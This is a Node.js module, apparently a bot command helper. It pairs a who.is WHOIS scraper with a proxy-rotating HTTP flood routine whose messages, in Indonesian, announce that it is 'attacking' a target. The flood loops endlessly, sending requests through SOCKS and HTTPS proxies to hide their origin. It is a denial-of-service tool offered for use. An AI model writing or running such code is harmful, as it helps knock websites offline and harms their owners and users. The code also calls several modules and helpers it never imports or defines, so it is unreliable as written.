const axios = require('axios');
const cheerio = require('cheerio');
const userIP = 'PermenMD';
const proxyListFile = 'proxy.txt';
const totalRequests = 5000;
const delay = 100;

const allowedIPs = ['PermenMD'];

async function whois(url) {
  try {
    const { data: html } = await axios.get('https://who.is/whois/'+url);
    const $ = cheerio.load(html);

    const data = $('.queryResponseBodyRow').map((_, element) => {
      const domain = $(element).find('.col-md-8.queryResponseBodyValue a').text();
      const ip = $(element).find('.col-md-4.queryResponseBodyValue a').text();
      return domain && ip ? { domain, ip } : null;
    }).get();

    const whoisInfo = $('pre').text().trim();

    const expiresOn = $("div:contains('Expires On')").next('.queryResponseBodyValue').text().trim() || null;
    const registeredOn = $("div:contains('Registered On')").next('.queryResponseBodyValue').text().trim() || null;
    const updatedOn = $("div:contains('Updated On')").next('.queryResponseBodyValue').text().trim() || null;

    return { domains: data, whoisInfo, expiresOn, registeredOn, updatedOn };
  } catch (error) {
    console.error('Error fetching data:', error);
    return null;
  }
}

function readProxyList() {
  try {
    const data = fs.readFileSync(proxyListFile, 'utf8');
    const lines = data.trim().split('\n');
    return lines.map(line => line.trim());
  } catch (error) {
    console.error(`Gagal membaca daftar proxy: ${error}`);
    return [];
  }
}

function sendRequest(target, agent, userIP) {
  if (allowedIPs.includes(userIP)) {
    axios.get(target, { httpAgent: agent })
      .then((response) => {
        console.log(`Menyerang ${target}`);
      })
      .catch((error) => {
        console.error(`Menyerang ${target}`);
      });
  } else {
    console.error(`IP Anda tidak terdaftar`);
  }
}

function sendRequests(targetUrl) {
  const proxyList = readProxyList();
  let currentIndex = 0;

  function sendRequestUsingNextProxy() {
    if (currentIndex < proxyList.length) {
      const proxyUrl = proxyList[currentIndex];
      let agent;

      if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
        agent = new SocksProxyAgent(proxyUrl);
      } else if (proxyUrl.startsWith('https')) {
        agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) });
      }

      sendRequest(targetUrl, agent, userIP);
      currentIndex++;
      setTimeout(sendRequestUsingNextProxy, 0);
    } else {
      setTimeout(() => sendRequests(targetUrl), delay);
    }
  }

  sendRequestUsingNextProxy();
}

module.exports = { whois, sendRequests }
